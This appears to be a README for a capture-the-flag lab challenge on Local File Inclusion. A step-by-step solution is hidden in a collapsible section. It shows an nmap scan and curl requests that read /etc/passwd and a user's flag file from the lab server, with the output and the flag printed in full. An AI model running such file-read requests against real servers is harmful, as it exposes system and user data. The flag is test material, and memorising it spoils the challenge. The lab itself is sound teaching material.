# Famous Quotes

Simple challenge for Local File Inclusion

### Task

Find an HTTP server at IP address `172.20.0.10` and try to exploit the naivity of the programmer to find a flag

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>


1. Use `nmap` to find opened ports:
```bash
root@hackerlab:~# nmap -sS -n -v 172.20.0.10
...
PORT     STATE SERVICE
8080/tcp open  http-proxy
MAC Address: 02:42:AC:14:00:0A (Unknown)
...
```

2. Discover the open port 8080 and try to manipulate the server functionality. Eventually you might discover LFI vulnerability and discover a user named bob in the `/etc/passwd` file. And finally, bob has a flag in his home directory:
```bash
root@hackerlab:~# curl 172.20.0.10:8080
Please specify a quote file to read in the URL path. Options are: ['asimov.txt', 'einstein.txt', 'jobs.txt']

root@hackerlab:~# curl 172.20.0.10:8080/asimov.txt
The true delight is in the finding out rather than in the knowing.

root@hackerlab:~# curl 172.20.0.10:8080/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bob:x:1000:1000::/home/bob:/bin/bash

root@hackerlab:~# curl 172.20.0.10:8080/home/bob/flag.txt
BSY{YouMaySayIamADreamerButIamNotTheOnlyOne}
```


</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
